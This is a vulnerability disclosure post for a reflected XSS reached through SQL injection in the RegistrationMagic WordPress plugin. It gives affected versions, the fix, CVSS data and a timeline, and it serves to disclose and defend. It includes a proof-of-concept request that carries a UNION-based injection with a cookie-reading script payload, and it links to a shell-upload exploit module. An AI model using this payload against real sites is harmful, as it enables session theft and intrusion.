---
layout: post
title: RegistrationMagic - Custom Registration Forms <= 3.7.9.2 Reflected XSS
date: 2017-12-10
categories:
  - security
  - websec
  - disclosure
tags:
  - wordpress
  - registrationmagic
  - reflected xss
excerpt: Using an SQL injection vulnerability, arbitrary markup can be reflected back to the user, achieving JavaScript execution in the context of the authenticated user.
---
## Homepage
[https://wordpress.org/plugins/custom-registration-form-builder-with-submission-manager/](https://wordpress.org/plugins/custom-registration-form-builder-with-submission-manager/)

## Overview
Using an SQL injection vulnerability, arbitrary markup can be reflected back to the user, achieving JavaScript execution in the context of the authenticated user.

See [This Link](https://www.rastating.com/registrationmagic-custom-registration-forms-3-7-9-2-authenticated-sql-injection) for information on the SQL injection vulnerability.

## CVSS Score
4.8

## CVSS Vector
[(AV:N/AC:M/Au:N/C:P/I:P/A:N/E:F/RL:OF/RC:C)](https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?vector=(AV:N/AC:M/Au:N/C:P/I:P/A:N/E:F/RL:OF/RC:C))

## Versions Affected
3.7.9.2 and below

## Solution
Update to version 3.7.9.3 or higher

## Proof of Concept
```
GET /wp-admin/admin.php?page=rm_field_manage&rm_form_id=-1+union+select+1%2C2%2C3%2C%27%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E%27%2Cconcat(0x54%2C0x65%2C0x78%2C0x74%2C0x62%2C0x6f%2C0x78)%2C6%2C7%2C8%2C9%2C10%2C11
```

## WordPress Exploit Framework Module
[exploit/xss/reflected/registrationmagic\_reflected\_xss\_shell\_upload](https://github.com/rastating/wordpress-exploit-framework/blob/development/lib/wpxf/modules/exploit/xss/reflected/registrationmagic_reflected_xss_shell_upload.rb)

## WPVDB-ID
[8976](https://wpvulndb.com/vulnerabilities/8976)

## Disclosure Timeline
* **2017-10-04**: Initial discovery
* **2017-12-10**: Released public disclosure
